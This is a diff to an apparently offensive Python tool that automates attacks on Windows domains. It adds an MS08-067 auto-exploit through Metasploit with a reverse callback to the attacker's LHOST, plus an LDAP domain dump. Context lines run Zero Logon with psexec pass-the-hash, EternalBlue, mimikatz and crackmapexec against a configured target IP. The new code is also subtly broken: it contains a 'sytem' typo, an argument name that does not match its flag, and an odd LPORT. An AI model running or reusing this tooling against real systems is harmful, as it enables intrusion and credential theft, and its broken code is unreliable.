@@ -11,14 +11,14 @@ from subprocess import call
 import urllib.request
 from os import system
 
-lhost = "10.10.0.16" #Your LHOST IP
+lhost = "172.16.1.2" #Your LHOST IP
 lport = "80" #Your web port (ex: 8080)
-inter = "tun0" #Your interface (ex: tun0 or eth0)
-domainip = "172.31.1.29" #Domain IP you are attacking if you do not know do a crackmapexec smb <rhost ip> -u fjdkasf -p /usr/share/wordlists/rockyou.txt and it will show you the domain name
-domain = "zero.csl" #Domain name
-username = "carrot" #if you have a username for the domain you are attacking insert here
+inter = "ppp0" #Your interface (ex: tun0 or eth0)
+domainip = "10.11.1.83" #Domain IP you are attacking if you do not know do a crackmapexec smb <rhost ip> -u fjdkasf -p /usr/share/wordlists/rockyou.txt and it will show you the domain name
+domain = "john" #Domain name
+username = "" #if you have a username for the domain you are attacking insert here
 userfile = "" #if you have a user file put here
-password = "P@ssw0rd!" #if you have a password that goes along with the username put here
+password = "" #if you have a password that goes along with the username put here
 passfile = "" #if you have a password file put here
 
 #Running multiple arguments is fine, howevever if running multiple and wanting to run Bloodhound make sure Bloodhound goes last...
@@ -32,8 +32,10 @@ parser.add_argument("-B", "--BloodHound", action="store_true", help="Run bloodho
 parser.add_argument("-C", "--Crackmapexec", action="store_true", help="Will try a bunch of things with crackmapexec")
 parser.add_argument("-S", "--SMBKiller", action="store_true", help="Run SMB_Killer Script by OvergrownCarrot1 to hopefully get NetNTLMv2 Hashes from share")
 parser.add_argument("-Z", "--Zero", action="store_true", help="Zero Logon Attack")
+parser.add_argument("-L", "--LDAP", action="store_true", help="LDAP Domain Dump")
 parser.add_argument("-E", "--Eternal", action="store_true", help="Test for EternalBlue and automatically exploit")
 parser.add_argument("-9", "--MS09050", action="store_true", help="Test for MS09-050 and automatically exploit")
+parser.add_argument("-8", "--MS08067", action="store_true", help="Test and exploit MS08-067 automatically")
 parser.add_argument("-M", "--Mimikatz", action="store_true", help="Will run mimikatz with crackmapexec, note takes a long time to run")
 parser.add_argument("-e", "--enum4linux", action="store_true", help="Will run enum4linux")
 parser.add_argument("-c", "--crack", action="store_true", help="Crack hashes with john the ripper")
@@ -237,6 +239,16 @@ def MS09050():
 	else:
 		print("\033[1;32m Not vulnerable\033[1;39m")
 
+def MS08067():
+	ret_code = system("ls eternal.txt")
+	if ret_code != 0:
+		print("\033[1;32m Running NMAP Vuln scan on port 445\033[1;39m\n")
+		system("nmap -p 445 --script=smb-vuln-* -Pn -T4 "+domainip+ " > eternal.txt")
+	search_word = "CVE:CVE-2008-4250"
+	if search_word in open("eternal.txt").read():
+		print("\033[1;31m Most likely vulnerable to MS08-067, exploiting with Metasploit\033[1;39m")
+		system("msfconsole -x 'use exploit/windows/smb/ms08_067_netapi; set LHOST "+lhost+" ;set RHOSTS "+domainip+" ; set LPORT 445 ; exploit'")
+
 def enum4linux():
 	ret_code = system("which enum4linux")
 	if ret_code != 0:
@@ -275,6 +287,17 @@ def zero():
 	hashes = input("\033[1;31mCopy the NTLM hash for the administrator and paste below (ex: aad3b435b51404eeaad3b435b51404ee:36242e2cb0b26d16fafd267f39ccf990)\n\033[1;39m")
 
 	system("impacket-psexec -hashes "+hashes+" administrator@"+domainip)
+
+def ldapdomaindump():
+	if(len(username) == 0) and (len(password) ==0):
+		print("\033[1;31m Trying LDAP Domain Dump with no username and password in folder ldap")
+		sytem("mkdir ldap")
+		system("ldapdomaindump ldap://"+domainip+":389")
+		system("firefox ldap/domain_*.html")
+	print("\033[1;31m Dumping Domain in folder ldap")
+	system("mkdir ldap")
+	system("ldapdomaindump "+domainip+" -u "+domain+'\\'+username+" -p "+password+"")
+	system("firefox ldap/domain_*.html")
 
 def crackmapexec():
 	if (len(username) == 0) and (len(password) == 0):
@@ -496,6 +519,8 @@ if args.Download == True:
 	neo4jDownload()
 if args.Zero == True:
 	zero()
+if args.ldapdomaindump == True:
+	ldapdomaindump()
 if args.Crackmapexec == True:
 	crackmapexec()
 if args.Mimikatz == True:
@@ -504,6 +529,8 @@ if args.Eternal == True:
 	eternal()
 if args.MS09050 == True:
 	MS09050()
+if args.MS08067 == True:
+	MS08067()
 if args.BloodHound == True:
 	bloodhound()
 if args.crack == True:
@@ -525,6 +552,8 @@ if args.attack == True:
 	attack()
 	eternal()
 	MS09050()
+	MS08067()
+	ldapdomaindump()
 	crackmapexec()
 	mimikatz()
 	zero()
